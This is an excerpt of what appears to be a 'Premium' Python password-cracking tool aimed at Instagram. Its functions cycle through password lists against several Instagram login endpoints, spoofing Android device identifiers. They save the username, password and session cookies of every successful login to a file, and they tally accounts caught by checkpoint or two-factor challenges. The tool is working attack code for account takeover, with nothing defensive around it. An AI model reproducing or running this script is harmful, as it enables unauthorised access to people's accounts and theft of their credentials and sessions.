...
{CYAN}╭──────────────────────╮{CYAN}╭───────────────╮{CYAN}╭─────────────────────────╮
{CYAN}│ {CYAN}Author : {GREEN}sumon {CYAN}│{CYAN}  │ {WHITE}Version : {GREEN}2.1 {CYAN}│{CYAN}│ {WHITE}Status : {GREEN}Premium{CYAN}    │
{CYAN}╰──────────────────────╯{CYAN}╰───────────────╯{CYAN}╰─────────────────────────╯""")
...
def Crack_api(username, kontol):
    ...
    for password in kontol:
        try:
            ...
            response = ses.get('https://www.instagram.com/accounts/login/', timeout=10)
            ...
            data = {
                'username': username,
                'enc_password': enc_password_encoded,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
            ...
            if result.get('authenticated') and result.get('userId'):
                cookie_str = "; ".join([f"{k}={v}" for k, v in ses.cookies.get_dict().items()])
                ...
                if len(bkas) % 2 == 0:
                    ...
                    open("data/OK.txt","a").write(f"{username}|{password}|{cookie_str}\n")
                    Ok += 1
                    return True
            elif 'checkpoint_url' in result or 'two_factor_required' in str(result):
                Cp += 1
...
def Crack_i(username, memek):
    ...
    for password in memek:
        try:
            ...
            data = {
                'signed_body': f'SIGNATURE.{json.dumps({"username": username, "enc_password": f"#PWD_INSTAGRAM:0:{base_ts}:{password}", "device_id": f"android-{android_id}", "guid": device_id})}'
            }
            
            response = ses.post('https://i.instagram.com/api/v1/accounts/login/', data=data, timeout=15)
            
            if 'logged_in_user' in str(response.text):
                cookies = ";".join([f"{k}={v}" for k, v in ses.cookies.get_dict().items()])
                bkas.append(username)
                if len(bkas) % 2 == 0:
                    ...
                    print(f"\r\033[1;92m [✓ SUCCESS] {username} | {password}")
                    open("data/OK.txt","a").write(f"{username}|{password}|{cookies}\n")
                    Ok += 1
                    return True
    ...
    for password in memek:
        try:
            ...
            data = {
                'params': json.dumps({
                    'client_input_params': {
                        'password': f"#PWD_INSTAGRAM:0:{base_ts}:{password}",
            ...
            response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, timeout=15)
...
def Crack_N(username, memek):
    ...
    for password in memek:
        try:
            ...
            data = {
                'signed_body': f'SIGNATURE.{json.dumps({"username": username, "enc_password": f"#PWD_INSTAGRAM:0:{int(time.time())}:{password}", "device_id": f"android-{_hash.hexdigest()[:16]}", "guid": device_id})}'
            }
            
            response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/', data=data, timeout=15)
